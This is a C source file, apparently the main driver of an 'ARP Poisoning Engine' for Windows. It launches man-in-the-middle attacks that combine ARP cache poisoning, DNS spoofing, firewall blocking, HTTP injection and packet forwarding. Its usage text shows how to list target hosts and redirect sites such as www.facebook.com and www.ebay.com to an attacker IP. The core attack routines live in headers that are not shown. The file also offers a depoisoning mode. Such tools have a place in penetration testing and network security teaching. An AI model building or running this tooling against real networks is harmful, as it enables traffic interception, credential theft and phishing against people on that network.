#define HAVE_REMOTE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <iphlpapi.h>
#include <Shlwapi.h>
#include <stdarg.h>

#include "APE.h"
#include "ArpPoisoning.h"
#include "Interface.h"
#include "LinkedListSystems.h"
#include "LinkedListFirewallRules.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "LinkedListHttpInjections.h"
#include "Logging.h"
#include "ModeDePoisoning.h"
#include "ModeMITM.h"
#include "NetworkFunctions.h"
#include "HttpPoisoning.h"
#include "DnsPoisoning.h"
#include "DnsResponseSpoofing.h"
#include "PacketProxy.h"
#include "getopt.h"

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "IPHLPAPI.lib")


/*
 * Extern variables
 *
 */
extern char *optarg;


/*
 * Global variables
 *
 */
CRITICAL_SECTION gDBCritSection;
CRITICAL_SECTION csSystemsLL;
CRITICAL_SECTION gCSOutputPipe;
CRITICAL_SECTION gCSConnectionsList;

// Linked lists
PSYSNODE gSystemsList = NULL;
PHOSTNODE gHostsList = NULL;
PRULENODE gFWRulesList = NULL;
PHTTPINJECTIONNODE gHttpInjectionList = NULL;

int gDEBUGLEVEL = DEBUG_LEVEL;


SCANPARAMS gScanParams;

HANDLE gRESENDThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gSCANThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gPOISONINGThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gARPReplyThreadHandle = INVALID_HANDLE_VALUE;

DWORD gRESENDThreadID = 0;
DWORD gSCANThreadID = 0;
DWORD gPOISONINGThreadID = 0;
DWORD gARPReplyThreadID = 0;

int gExitProcess = NOK;
char **gARGV = NULL;




/*
 *
 * Main:  Program entry point
 *
 */

int main(int argc, char **argv)
{
  int retVal = 0;
  int opt = 0;
  char action = 0;
  
  // Initialisation
  if (!InitializeCriticalSectionAndSpinCount(&gDBCritSection, 0x00000400) ||
    !InitializeCriticalSectionAndSpinCount(&csSystemsLL, 0x00000400) ||
    !InitializeCriticalSectionAndSpinCount(&gCSOutputPipe, 0x00000400) ||
    !InitializeCriticalSectionAndSpinCount(&gCSConnectionsList, 0x00000400))
  {
    retVal = 1;
    goto END;
  }

  LogMsg(DBG_LOW, "main(): Starting %s", argv[0]);
  ZeroMemory(&gScanParams, sizeof(gScanParams));
  strncpy(gScanParams.ApplicationName, argv[0], sizeof(gScanParams.ApplicationName));
  gARGV = argv;

  gSystemsList = InitSystemList();
  gFWRulesList = InitFirewallRules();
  gHostsList = InitHostsList();
  gHttpInjectionList = InitHttpInjectionList();

  // Parse command line parameters
  while ((opt = getopt(argc, argv, "d:lf:x:")) != -1)
  {
    switch (opt)
    {
    case 'd':
      if (argc == 3)
      {
        strncpy((char *)gScanParams.InterfaceName, optarg, sizeof(gScanParams.InterfaceName));
        GetInterfaceName(optarg, (char *)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(optarg, &gScanParams);
      }
      break;
    case 'l':
      if (argc == 2)
      {
        action = 'l';
      }
      break;
    case 'x':
      if (argc == 3)
      {
        action = 'x';
        strncpy(gScanParams.InterfaceName, optarg, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceName(optarg, (char *)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(optarg, &gScanParams);
      }
      break;
    case 'f':
      if (argc == 4)
      {
        action = 'f';
        strncpy(gScanParams.PcapFilePath, argv[3], sizeof(gScanParams.PcapFilePath) - 1);
        strncpy(gScanParams.InterfaceName, optarg, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceName(optarg, (char *)gScanParams.InterfaceName, sizeof(gScanParams.InterfaceName) - 1);
        GetInterfaceDetails(optarg, &gScanParams);
      }
      break;
    }
  }


  // List all interfaces
  if (action == 'l')
  {
    ListInterfaceDetails();
    goto END;


  // ARP depoisening
  }
  else if (action == 'd')
  {
    InitializeDePoisoning();

  // Process data from pcap data dump file
  }
  else if (action == 'f')
  {
    LogMsg(2, "main(): -f %s pcapFile=%s\n", gScanParams.InterfaceName, gScanParams.PcapFilePath);
//
    InitializeParsePcapDumpFile();



  // Start ...
  //  - ARP cache poisoning
  //  - Firewall blocking
  //  - DNS poisoning 
  //  - forwarding data packets
  }
  else if (action == 'x')
  {
    InitializeMITM();
  }
  else
  {
    PrintUsage(argv[0]);
  }

END:

  DeleteCriticalSection(&gDBCritSection);
  DeleteCriticalSection(&csSystemsLL);
  DeleteCriticalSection(&gCSOutputPipe);
  DeleteCriticalSection(&gCSConnectionsList);

  LogMsg(DBG_LOW, "main(): Stopping %s", argv[0]);

  return retVal;
}



void PrintUsage(char *pAppName)
{
  system("cls");
  printf("\nAPE (ARP Poisoning Engine) Version %s\n", APE_VERSION);
  printf("---------------------------------------\n\n");
  printf("List all interfaces               :  %s -l\n", pAppName);
  printf("Start poisoning and forwarding    :  %s -x IFC-Name\n", pAppName);
  printf("Start depoisoning target systems  :  %s -d IFC-Name\n", pAppName);
  printf("Parse packets from pcap file      :  %s -f IFC-Name datadump.pcap\n", pAppName);
  printf("\n\n\nAdd the ARP cache poisoning target system IP and MAC addresses \nto the file .targethosts\n\n");
  printf("192.168.0.58,00:1B:77:53:5C:F8\n");
  printf("192.168.0.59,00:3A:21:3C:11:27\n");
  printf("\n\n\nAdd the DNS poisoning target host names and the spoofed IP \naddresses to the file .dnshosts\n\n");
  printf("www.facebook.com,192.168.0.58\n");
  printf("www.ebay.com,192.168.0.58\n");
  printf("\n\n\nAdd the system data from blocked connections\nto the file .fwrules\n\n");
  printf("TCP:192.168.0.4:1:65535:0.0.0.0:80:80\n");
  printf("UDP:192.168.0.4:1:65535:7.7.7.7:53:53\n");
  printf("\n\n\n\nExamples\n--------\n\n");
  printf("Example : %s -x 0F716AAF-D4A7-ACBA-1234-EA45A939F624\n", pAppName);
  printf("Example : %s -f datadump.pcap\n\n\n\n", pAppName);
  printf("WinPcap version\n---------------\n\n");
  printf("%s\n\n", pcap_lib_version());
}



void Stringify(unsigned char *inputParam, int inputLenthParam, unsigned char *outputParam)
{
  int counter = 0;

  if (inputParam == NULL || outputParam == NULL)
  {
    return;
  }

  for (; counter < inputLenthParam && inputParam[counter] != '\0'; counter++)
  {
    //    if (pInput[lCounter] < 32 || pInput[lCounter] > 176)
    if (inputParam[counter] < 32 || inputParam[counter] > 126)
    {
      outputParam[counter] = '.';
    }
    else
    {
      outputParam[counter] = inputParam[counter];
    }
  }
}



BOOL APE_ControlHandler(DWORD pControlType)
{
  switch (pControlType)
  {
    // Handle the CTRL-C signal. 
  case CTRL_C_EVENT:
    LogMsg(DBG_INFO, "Ctrl-C event : Starting depoisoning process");
    StartUnpoisoningProcess();
    return FALSE;

  case CTRL_CLOSE_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Close event : Starting depoisoning process");
    StartUnpoisoningProcess();
    return FALSE;

  case CTRL_BREAK_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Break event : Starting depoisoning process");
    StartUnpoisoningProcess();
    return FALSE;

  case CTRL_LOGOFF_EVENT:
    printf("Ctrl-Logoff event : Starting depoisoning process");
    StartUnpoisoningProcess();
    return FALSE;

  case CTRL_SHUTDOWN_EVENT:
    LogMsg(DBG_INFO, "Ctrl-Shutdown event : Starting depoisoning process");
    StartUnpoisoningProcess();
    return FALSE;

  default:
    LogMsg(DBG_INFO, "Unknown event \"%d\" : Starting depoisoning process", pControlType);
    StartUnpoisoningProcess();
    return FALSE;
  }
}



void PrintConfig(SCANPARAMS scanParamsParam)
{
  printf("Local IP :\t%d.%d.%d.%d\n", scanParamsParam.LocalIpBin[0], scanParamsParam.LocalIpBin[1], scanParamsParam.LocalIpBin[2], scanParamsParam.LocalIpBin[3]);
  printf("Local MAC :\t%02hhX-%02hhX-%02hhX-%02hhX-%02hhX-%02hhX\n", scanParamsParam.LocalMacBin[0], scanParamsParam.LocalMacBin[1], scanParamsParam.LocalMacBin[2],
    scanParamsParam.LocalMacBin[3], scanParamsParam.LocalMacBin[4], scanParamsParam.LocalMacBin[5]);
  printf("GW MAC :\t%02hhX-%02hhX-%02hhX-%02hhX-%02hhX-%02hhX\n", scanParamsParam.GatewayMacBin[0], scanParamsParam.GatewayMacBin[1], scanParamsParam.GatewayMacBin[2],
    scanParamsParam.GatewayMacBin[3], scanParamsParam.GatewayMacBin[4], scanParamsParam.GatewayMacBin[5]);
  printf("GW IP :\t\t%d.%d.%d.%d\n", scanParamsParam.GatewayIpBin[0], scanParamsParam.GatewayIpBin[1], scanParamsParam.GatewayIpBin[2], scanParamsParam.GatewayIpBin[3]);
  printf("Start IP :\t%d.%d.%d.%d\n", scanParamsParam.StartIpBin[0], scanParamsParam.StartIpBin[1], scanParamsParam.StartIpBin[2], scanParamsParam.StartIpBin[3]);
  printf("Stop IP :\t%d.%d.%d.%d\n", scanParamsParam.StopIpBin[0], scanParamsParam.StopIpBin[1], scanParamsParam.StopIpBin[2], scanParamsParam.StopIpBin[3]);
}
